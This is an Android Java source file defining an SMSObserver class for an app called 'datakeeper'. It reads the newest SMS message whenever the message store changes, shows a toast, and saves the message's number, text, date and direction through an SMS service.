package com.epicsquad.datakeeper.observer;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.widget.Toast;
import com.epicsquad.datakeeper.common.Utils;
import com.epicsquad.datakeeper.model.domain.SMS;
import com.epicsquad.datakeeper.model.domain.SMSType;
import com.epicsquad.datakeeper.service.SMSService;
import com.epicsquad.datakeeper.service.impl.SMSServiceImpl;

public class SMSObserver extends ContentObserver {

    private static final int MESSAGE_TYPE_RECEIVED = 1;
    private static final int MESSAGE_TYPE_SENT = 2;

    private final SMSService smsService = new SMSServiceImpl();
    private final Context context;

    public SMSObserver(Handler handler, Context context) {
        super(handler);
        this.context = context;
    }

    @Override
    public void onChange(boolean selfChange) {
        try {
            Toast.makeText(context, "Sms intercepted", Toast.LENGTH_LONG).show();
            super.onChange(selfChange);
            Uri uriSMSURI = Uri.parse(Utils.SMS_URI_PATH);
            Cursor result =  context.getContentResolver().query(uriSMSURI, null, null, null, "date DESC LIMIT 1");
            result.moveToFirst();

            int smsType = result.getInt(result.getColumnIndex("type"));
            String message = result.getString(result.getColumnIndex("body"));
            long date = result.getLong(result.getColumnIndex("date"));
            String number = result.getString(result.getColumnIndex("address"));

            SMS sms = new SMS();
            sms.setTimestamp(date);
            sms.setNumber(number);
            sms.setText(message);
            if (smsType == MESSAGE_TYPE_SENT){
                sms.setType(SMSType.OUTGOING);
            } else if (smsType == MESSAGE_TYPE_RECEIVED){
                sms.setType(SMSType.INCOMING);
            }
            smsService.save(sms);
        } catch (Exception e){
            Utils.processException(e, SMSObserver.class, "onChange");
        }
    }
}
